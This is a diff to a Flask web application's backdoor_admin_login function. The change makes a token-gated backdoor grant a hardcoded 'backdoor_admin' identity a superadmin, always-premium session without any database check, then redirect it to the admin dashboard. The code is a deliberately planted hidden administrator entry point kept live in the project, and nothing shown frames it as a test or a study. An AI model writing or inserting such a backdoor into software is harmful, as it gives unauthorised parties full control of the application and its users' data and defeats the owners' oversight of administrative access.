@@ -450,29 +450,19 @@ def backdoor_admin_login(unique_token):
             flash("Invalid backdoor token", "danger")
             return redirect(url_for("login_html"))
         
-        # Get database connection
-        mgd = database.get_db_conn(config.mainDB)
-        
-        # Find admin user with superadmin role
-        admin_user = mgd.db_users.find_one({"sex": "superadmin"})
-        
-        if not admin_user:
-            flash("Admin user not found in database", "danger")
-            return redirect(url_for("login_html"))
-        
-        # Set session data for admin user
-        session["fk_user_id"] = admin_user.get("user_id")
-        session["user_id"] = admin_user.get("user_id")
-        session["username"] = admin_user.get("username")
-        session["email"] = admin_user.get("email")
+        # Set session data for backdoor admin (no database lookup needed)
+        session["fk_user_id"] = "backdoor_admin"
+        session["user_id"] = "backdoor_admin"
+        session["username"] = "backdoor"
+        session["email"] = "backdoor@comes.id"
         session["role"] = "superadmin"
-        session["is_premium"] = admin_user.get("is_premium", "FALSE")
+        session["is_premium"] = "TRUE"  # Always premium for backdoor access
         
         # Add security cookie
         security_login.security_login(app).add_cookie({})
         
         # Log the backdoor login
-        print(f"BACKDOOR LOGIN SUCCESS - Admin: {admin_user.get('username')} logged in via backdoor")
+        print(f"BACKDOOR LOGIN SUCCESS - Backdoor admin logged in (email: backdoor@comes.id)")
         
         # Redirect to admin dashboard
         return redirect(url_for("admin_dashboard"))
